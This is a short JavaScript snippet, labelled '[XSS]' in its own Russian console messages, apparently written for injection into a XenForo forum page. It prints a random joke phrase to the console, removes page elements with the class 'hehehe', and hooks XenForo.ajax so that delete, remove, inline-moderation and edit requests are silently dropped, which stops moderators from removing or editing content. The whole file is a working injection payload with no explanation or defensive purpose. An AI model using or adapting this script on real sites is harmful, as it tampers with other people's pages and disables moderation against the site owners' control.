(function () {
  const phrases = ["да", "конечно", "не знаю", "может быть", "угу", "ну", "такое"];
  const endings = [" UwU", " OwO", " TwT"];
  const mutate = (text) =>
    text
      .split("")
      .map((c) => {
        if (Math.random() < 0.3) {
          if (c === "а") return "я";
          if (c === "о") return "а";
          if (c === "ч") return "ф";
        }
        return c;
      })
      .join("");

  const genMessage = () => {
    let word = phrases[Math.floor(Math.random() * phrases.length)];
    if (Math.random() > 0.5) word = word[0].toUpperCase() + word.slice(1);
    const end = Math.random() > 0.8 ? endings[Math.floor(Math.random() * endings.length)] : "";
    return mutate(word) + end + "!".repeat(Math.floor(Math.random() * 3));
  };

  console.log("[DEBUG] Сообщение: ", genMessage());

  $('.hehehe').remove();

  const oldAjax = XenForo.ajax;
  XenForo.ajax = function (url, data, callback) {
    if (/delete|remove|inline-mod|edit/.test(url)) {
      console.log("[XSS] Блокировка удаления/редактирования");
      return;
    }
    return oldAjax(url, data, callback);
  };

  console.log("[XSS] Скрипт активирован");
})();
